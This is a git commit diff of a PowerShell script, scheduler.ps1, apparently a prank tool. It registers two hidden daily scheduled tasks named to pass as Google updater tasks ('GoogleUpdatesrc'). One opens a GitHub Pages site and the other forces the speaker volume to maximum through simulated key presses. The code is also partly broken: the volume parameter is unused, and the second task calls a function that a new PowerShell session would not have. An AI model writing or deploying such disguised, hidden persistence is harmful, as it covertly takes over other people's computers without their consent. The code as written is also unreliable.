6dca6e2ff6336457828bad68047b3c9bad0e49c7
luigit12 <58264257+Luigit12@users.noreply.github.com>
2021-06-07 11:39:41 +0200

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,15 +1,13 @@
 
-Function{
-  setspeaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..50 | % {$wshShell.SendKeys([char]175)}}
-}
+Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..50 | % {$wshShell.SendKeys([char]175)}}
 
-Set-Alias Set-Speaker setspeaker
+Set-Alias setspeaker Set-Speaker
 
 $settings = New-ScheduledTaskSettingsSet -Hidden
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Start-Process https://Luigit12.github.io"
 $trigger = New-ScheduledTaskTrigger -Daily -At 11:00
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdatesrc' -Settings $settings
 
-$action2 = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Set-Speaker"
+$action2 = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "setspeaker"
 $trigger2 = New-ScheduledTaskTrigger -Daily -At 10:59
 Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName 'GoogleUpdatesrc2' -Settings $settings
